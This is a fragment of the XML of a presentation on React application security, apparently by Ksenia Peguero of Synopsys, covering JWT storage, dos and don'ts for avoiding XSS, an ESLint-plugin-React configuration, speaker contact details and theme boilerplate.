            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="4550220"/>
            <a:ext cx="1697901" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>XSS Payload</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="5366180"/>
            <a:ext cx="10972800" cy="925759"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lst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a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Solution:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Store JWTs in the cookies if you are using them for sessions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Do not store sensitive information in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sessionStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23740274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 and Recommendations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Don’ts:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do not use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do not use untrusted input in creating URI attributes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do not create components dynamically</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do not save sensitive data in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Dos:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do perform JavaScript encoding of the state when using SSR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do use authenticated POST requests with fetch()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do use type checking in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>PropTypes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> in React </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://reactjs.org/docs/typechecking-with-proptypes.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Do use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ESLint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ESLint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>-plugin-React </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://github.com/yannickcr/eslint-plugin-react/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="852008471"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6400548" y="2165589"/>
          <a:ext cx="5468364" cy="1785904"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="5468364">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1583231158"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="974628">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"react/no-danger"</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"error"</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"react/no-danger-with-children"</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"error"</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"react/void-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>dom</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>-elements-no-children"</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“warn"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>,</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"react/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>jsx</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>-no-duplicate-props"</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"warn"</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"react/forbid-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>dom</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>-props"</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"error"</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"forbid"</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i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>href</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"</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r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>formaction</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>]</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}]</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="79024" marR="79024" marT="39512" marB="39512" anchor="ctr">
                    <a:lnL>
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR>
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT>
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB>
                      <a:noFill/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2">
                        <a:lumMod val="95000"/>
                      </a:schemeClr>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2002312474"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400548" y="1778034"/>
            <a:ext cx="3185487" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>ESLint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>-plugin-React Config</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="252487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4" name="Text Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1524000" y="4136571"/>
            <a:ext cx="10058400" cy="2111830"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ksenia Peguero</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>ksenia@synopsys.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Twitter: @</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>KseniaDmitrieva</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.synopsys.com/software</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>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2515" y="2670950"/>
            <a:ext cx="1814482" cy="3805370"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35879197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HAPE" val="Y"/>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TEMPLATE-001" val="12/13/2015 5:23:58 PM"/>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TEMPLATE-001" val="12/19/2015 4:31:23 PM"/>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TEMPLATE-001" val="12/24/2015 3:32:09 PM"/>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TEMPLATE-001" val="1/6/2016 2:39:37 PM"/>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SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag60.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag61.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag62.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag63.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag64.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag65.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag66.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag67.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag68.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag69.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag70.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag71.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag72.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag73.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag74.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag75.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag76.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag77.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="SYNOPSYS-SHAPE" val="Y"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag78.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Default Theme">
  <a:themeElements>
    <a:clrScheme name="Default Theme">
      <a:dk1>
        <a:sysClr val="windowText" lastClr="000000"/>
      </a:dk1>
      <a:lt1>
        <a:sysClr val="window" lastClr="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="000000"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="FFFFFF"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="4F2683"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="F69008"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="46AA42"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="C41300"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="BCBCBC"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="0072AC"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="0000FF"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="800080"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Default Theme">
      <a:majorFont>
        <a:latin typeface="Arial" panose="020B0604020202020204"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
        <a:font script="Jpan" typeface="メイリオ"/>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メイリオ"/>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fault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800" dirty="0"/>
        </a:defPPr>
      </a:lstStyle>
      <a:style>
        <a:lnRef idx="2">
          <a:schemeClr val="accent1">
            <a:shade val="50000"/>
          </a:schemeClr>
        </a:lnRef>
        <a:fillRef idx="1">
          <a:schemeClr val="accent1"/>
        </a:fillRef>
        <a:effectRef idx="0">
          <a:schemeClr val="accent1"/>
        </a:effectRef>
        <a:fontRef idx="minor">
          <a:schemeClr val="lt1"/>
        </a:fontRef>
      </a:style>
    </a:spDef>
    <a:lnDef>
      <a:spPr>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800" dirty="0"/>
        </a:defPPr>
      </a:lstStyle>
    </a:txDef>
  </a:objectDefaults>
  <a:extraClrSchemeLst/>
  <a:extLst>
    <a:ext uri="{05A4C25C-085E-4340-85A3-A5531E510DB2}">
